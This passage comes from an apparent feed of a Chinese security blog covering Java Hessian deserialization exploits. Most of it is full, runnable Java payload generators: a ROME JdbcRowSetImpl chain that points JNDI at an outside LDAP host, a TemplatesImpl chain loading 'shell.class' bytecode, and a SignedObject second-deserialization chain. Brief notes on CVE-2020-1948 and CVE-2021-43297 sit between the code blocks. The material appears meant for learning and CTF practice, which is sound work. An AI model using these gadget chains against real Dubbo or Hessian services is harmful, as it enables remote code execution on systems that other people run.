class="params">(Object obj, String name)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> field.get(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">JdbcRowSetImpl</span> <span class="variable">jdbcRowSet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JdbcRowSetImpl</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;ldap://192.168.142.129:9999/EXP&quot;</span>;</span><br><span class="line">        jdbcRowSet.setDataSourceName(url);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(JdbcRowSetImpl.class,jdbcRowSet);</span><br><span class="line">        <span class="type">EqualsBean</span> <span class="variable">equalsBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(ToStringBean.class,toStringBean);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//手动生成HashMap，防止提前调用hashcode()</span></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> makeMap(equalsBean,<span class="string">&quot;1&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] s = serialize(hashMap);</span><br><span class="line">        System.out.println(s);</span><br><span class="line">        System.out.println((HashMap)deserialize(s));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> HashMap&lt;Object, Object&gt; <span class="title function_">makeMap</span> <span class="params">( Object v1, Object v2 )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        HashMap&lt;Object, Object&gt; s = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        setValue(s, <span class="string">&quot;size&quot;</span>, <span class="number">2</span>);</span><br><span class="line">        Class&lt;?&gt; nodeC;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Node&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> ( ClassNotFoundException e ) &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Entry&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="type">int</span>.class, Object.class, Object.class, nodeC);</span><br><span class="line">        nodeCons.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">tbl</span> <span class="operator">=</span> Array.newInstance(nodeC, <span class="number">2</span>);</span><br><span class="line">        Array.set(tbl, <span class="number">0</span>, nodeCons.newInstance(<span class="number">0</span>, v1, v1, <span class="literal">null</span>));</span><br><span class="line">        Array.set(tbl, <span class="number">1</span>, nodeCons.newInstance(<span class="number">0</span>, v2, v2, <span class="literal">null</span>));</span><br><span class="line">        setValue(s, <span class="string">&quot;table&quot;</span>, tbl);</span><br><span class="line">        <span class="keyword">return</span> s;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230706165052839.png" alt="image-20230706165052839"></p><p><img src="../images/image-20230706165058207.png" alt="image-20230706165058207"></p><p>成功弹出计算器</p><h3 id="Apache-Dubbo-Hessian反序列化漏洞（CVE-2020-1948）"><a href="#Apache-Dubbo-Hessian反序列化漏洞（CVE-2020-1948）" class="headerlink" title="Apache Dubbo Hessian反序列化漏洞（CVE-2020-1948）"></a>Apache Dubbo Hessian反序列化漏洞（CVE-2020-1948）</h3><p>Apache Dubbo 是一款高性能的开源Java RPC框架。</p><h4 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h4><ul><li>2.7.0 &lt;= Dubbo Version &lt;= 2.7.6</li><li>2.6.0 &lt;= Dubbo Version &lt;= 2.6.7</li><li>Dubbo 所有 2.5.x 版本（官方团队目前已不支持）</li></ul><p><strong>这里的就不写了  了解一下就行了  因为搭建环境太麻烦了</strong></p><h3 id="TemplatesImpl-SignedObject二次反序列化-ROME不出网"><a href="#TemplatesImpl-SignedObject二次反序列化-ROME不出网" class="headerlink" title="TemplatesImpl+SignedObject二次反序列化(ROME不出网)"></a>TemplatesImpl+SignedObject二次反序列化(ROME不出网)</h3><p>上文我们构造的都是<code>JdbcRowSetImpl</code>这条ROME链，最终结果是造成JNDI注入。那如果目标不出网，我们又怎么利用呢？</p><p>或许你还记得ROME中的<code>TemplatesImpl</code>利用链，其能够加载任意类，进而任意代码执行。下面我们来尝试构造</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.HessianInput;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.HessianOutput;</span><br><span class="line"><span class="keyword">import</span> com.rometools.rome.feed.impl.ObjectBean;</span><br><span class="line"><span class="keyword">import</span> com.rometools.rome.feed.impl.ToStringBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Array;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hessian2_TemplatesImpl</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> HashMap&lt;Object, Object&gt; <span class="title function_">makeMap</span> <span class="params">( Object v1, Object v2 )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        HashMap&lt;Object, Object&gt; s = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        setValue(s, <span class="string">&quot;size&quot;</span>, <span class="number">2</span>);</span><br><span class="line">        Class&lt;?&gt; nodeC;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Node&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> ( ClassNotFoundException e ) &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Entry&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="type">int</span>.class, Object.class, Object.class, nodeC);</span><br><span class="line">        nodeCons.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">tbl</span> <span class="operator">=</span> Array.newInstance(nodeC, <span class="number">2</span>);</span><br><span class="line">        Array.set(tbl, <span class="number">0</span>, nodeCons.newInstance(<span class="number">0</span>, v1, v1, <span class="literal">null</span>));</span><br><span class="line">        Array.set(tbl, <span class="number">1</span>, nodeCons.newInstance(<span class="number">0</span>, v2, v2, <span class="literal">null</span>));</span><br><span class="line">        setValue(s, <span class="string">&quot;table&quot;</span>, tbl);</span><br><span class="line">        <span class="keyword">return</span> s;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; <span class="type">byte</span>[] serialize(T o) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bao</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">HessianOutput</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HessianOutput</span>(bao);</span><br><span class="line">        output.writeObject(o);</span><br><span class="line">        System.out.println(bao.toString());</span><br><span class="line">        <span class="keyword">return</span> bao.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">deserialize</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bai</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes);</span><br><span class="line">        <span class="type">HessianInput</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HessianInput</span>(bai);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> input.readObject();</span><br><span class="line">        <span class="keyword">return</span> (T) o;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesimpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] bytecodes = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\google download\\shell.class&quot;</span>));</span><br><span class="line"></span><br><span class="line">        setValue(templatesimpl,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        setValue(templatesimpl,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;bytecodes&#125;);</span><br><span class="line">        setValue(templatesimpl, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(TemplatesImpl.class,templatesimpl);</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectBean</span> <span class="variable">objectBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(ToStringBean.class,toStringBean);</span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> makeMap(objectBean,<span class="string">&quot;1&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] payload = serialize(hashMap);</span><br><span class="line">        deserialize(payload);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里其实是由于<code>TemplatesImpl</code>类中被<code>transient</code>修饰的<code>_tfactory</code>属性无法被序列化，进而导致<code>TemplatesImpl</code>类无法初始化<img src="../images/image-20230706175648609.png" alt="image-20230706175648609"></p><p><strong>但是如果在jdk的原生反序列化的话就可以序列化成功</strong></p><p>我们知道，在使用Java原生的反序列化时，如果被反序列化的类重写了<code>readObject()</code>，那么Java就会通过反射来调用重写的<code>readObject()</code></p><p><img src="../images/image-20230706175844926.png" alt="image-20230706175844926"></p><p>可以看到这里手动new了一个TransformerFactoryImpl类赋值给<code>_tfactory</code>，这样就解决了<code>_tfactory</code>无法被序列化的情况</p><p>当一个变量被声明为 transient 时，在进行对象的序列化过程中，该变量的值不会被持久化保存到字节流中。这意味着在对象被反序列化后，<strong>该变量的值将会被设置为其默认值，而不是序列化时的值。</strong></p><p>如果一个类中包含了 <code>readObject</code> 方法，在对象进行反序列化时，会按照以下顺序执行相关操作：</p><ol><li>默认的反序列化操作会读取对象的非 transient 字段，并将它们的值恢复。</li><li>如果类中有 <code>readObject</code> 方法，那么该方法会被调用。在这个方法中，你可以自定义读取和恢复对象状态的过程。你可以使用 <code>defaultReadObject</code> 方法读取默认字段值，也可以通过实现自定义逻辑来恢复其他字段的值。</li><li>反序列化过程完成后，返回反序列化后的对象。</li></ol><p><strong>所以说就是变量被声明为 transient的时候可以进行序列化操作，只不过是会再反序列化(<code>readobject</code>)的时候值仍然是默认值</strong> </p><p><strong>那么我们应该怎么办呢  想法就是想让其进行序列化成功，如何然后再使用<code>hessian</code>进行反序列化</strong></p><p>这里的话我们就可以想到二次反序列化了  这里使用的是<code>SignedObject</code>这个类</p><p><img src="../images/image-20230706180355930.png" alt="image-20230706180355930"></p><p><strong>这里面用的就是原生的jdk序列</strong></p><p>在SignedObject类的构造函数能够序列化一个类并且将其存储到属性<code>content</code>中</p><p>在其<code>getObject()</code>中能够将其反序列化出来，并且该方法还是getter</p><p><img src="../images/image-20230706200004122.png" alt="image-20230706200004122"></p><p>rome 的<code>ToStringBean</code>的<code>toString()</code>方法  是可以调用任意<code>getter</code>方法的</p><p><strong>这就完美符合我们的利用条件，于是可以构造出如下Payload</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.Hessian2Input;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.Hessian2Output;</span><br><span class="line"><span class="keyword">import</span> com.rometools.rome.feed.impl.EqualsBean;</span><br><span class="line"><span class="keyword">import</span> com.rometools.rome.feed.impl.ToStringBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Array;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.security.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hessian2_SignedObject</span> &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesimpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] bytecodes = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\ctf application\\idea_vip\\IntelliJ IDEA 2023.1.2\\project\\Hessian\\src\\main\\java\\org\\example\\calc.class&quot;</span>));</span><br><span class="line"></span><br><span class="line">        setValue(templatesimpl,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        setValue(templatesimpl,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;bytecodes&#125;);</span><br><span class="line">        setValue(templatesimpl, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class,templatesimpl);</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="number">123</span>);</span><br><span class="line">        setValue(badAttributeValueExpException,<span class="string">&quot;val&quot;</span>,toStringBean);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//此处写法较为固定，用于初始化SignedObject类</span></span><br><span class="line">        KeyPairGenerator keyPairGenerator;</span><br><span class="line">        keyPairGenerator = KeyPairGenerator.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line">        keyPairGenerator.initialize(<span class="number">1024</span>);</span><br><span class="line">        <span class="type">KeyPair</span> <span class="variable">keyPair</span> <span class="operator">=</span> keyPairGenerator.genKeyPair();</span><br><span class="line">        <span class="type">PrivateKey</span> <span class="variable">privateKey</span> <span class="operator">=</span> keyPair.getPrivate();</span><br><span class="line">        <span class="type">Signature</span> <span class="variable">signingEngine</span> <span class="operator">=</span> Signature.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">SignedObject</span> <span class="variable">signedObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SignedObject</span>(badAttributeValueExpException,privateKey,signingEngine);</span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(SignedObject.class, signedObject);</span><br><span class="line"></span><br><span class="line">        <span class="type">EqualsBean</span> <span class="variable">equalsBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(ToStringBean.class,toStringBean1);</span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> makeMap(equalsBean, equalsBean);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] payload = Hessian2_Serial(hashMap);</span><br><span class="line">        Hessian2_Deserial(payload);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] Hessian2_Serial(Object o) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">Hessian2Output</span> <span class="variable">hessian2Output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Output</span>(baos);</span><br><span class="line">        hessian2Output.writeObject(o);</span><br><span class="line">        hessian2Output.flushBuffer();</span><br><span class="line">        <span class="keyword">return</span> baos.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">Hessian2_Deserial</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes);</span><br><span class="line">        <span class="type">Hessian2Input</span> <span class="variable">hessian2Input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Input</span>(bais);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> hessian2Input.readObject();</span><br><span class="line">        <span class="keyword">return</span> o;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> HashMap&lt;Object, Object&gt; <span class="title function_">makeMap</span> <span class="params">(Object v1, Object v2 )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        HashMap&lt;Object, Object&gt; s = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        setValue(s, <span class="string">&quot;size&quot;</span>, <span class="number">2</span>);</span><br><span class="line">        Class&lt;?&gt; nodeC;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Node&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> ( ClassNotFoundException e ) &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Entry&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="type">int</span>.class, Object.class, Object.class, nodeC);</span><br><span class="line">        nodeCons.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">tbl</span> <span class="operator">=</span> Array.newInstance(nodeC, <span class="number">2</span>);</span><br><span class="line">        Array.set(tbl, <span class="number">0</span>, nodeCons.newInstance(<span class="number">0</span>, v1, v1, <span class="literal">null</span>));</span><br><span class="line">        Array.set(tbl, <span class="number">1</span>, nodeCons.newInstance(<span class="number">0</span>, v2, v2, <span class="literal">null</span>));</span><br><span class="line">        setValue(s, <span class="string">&quot;table&quot;</span>, tbl);</span><br><span class="line">        <span class="keyword">return</span> s;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>个人理解</strong></p><p>在序列化的时候<img src="../images/image-20230706214832344.png" alt="image-20230706214832344"></p><p>这个回执行里面的方法来奖上面的<code>templatesimpl</code>给序列化掉</p><p>然后在反序列化的时候</p><p><img src="../images/image-20230706214927202.png" alt="image-20230706214927202"></p><p>这个方法会调用任意<code>getter</code>方法  然后就会调用到<code>SignedObject</code>里面的<code>getObject</code>方法</p><p><img src="../images/image-20230706215135347.png" alt="image-20230706215135347"></p><p>然后就会执行反序列化操作  最后执行恶意代码</p><p><img src="../images/image-20230706215244806.png" alt="image-20230706215244806"></p><h3 id="Apache-Dubbo-Hessian2异常处理反序列化漏洞（CVE-2021-43297）"><a href="#Apache-Dubbo-Hessian2异常处理反序列化漏洞（CVE-2021-43297）" class="headerlink" title="Apache Dubbo Hessian2异常处理反序列化漏洞（CVE-2021-43297）"></a>Apache Dubbo Hessian2异常处理反序列化漏洞（CVE-2021-43297）</h3><p>这里的话了解就行  因为搭建环境比较麻烦</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://goodapple.top/archives/1193&quot;&gt;文章1&lt;/a&gt;    &lt;a href=&quot;https://su18.org/post/hessian/#xbean&quot;&gt;文章2&lt;/a&gt;  &lt;a href=&quot;https://juejin.</summary>
      
    
    
    
    
    <category term="java-Hessian" scheme="https://ke1nys.github.io/tags/java-Hessian/"/>
    
  </entry>
  
  <entry>
    <title>ciscn决赛-2022-backdoor</title>
    <link href="https://ke1nys.github.io/posts/869a12bf.html"/>
    <id>https://ke1nys.github.io/posts/869a12bf.html</id>
    <published>2023-06-21T07:58:09.000Z</published>
    <updated>2023-06-21T08:41:22.393Z</updated>
    
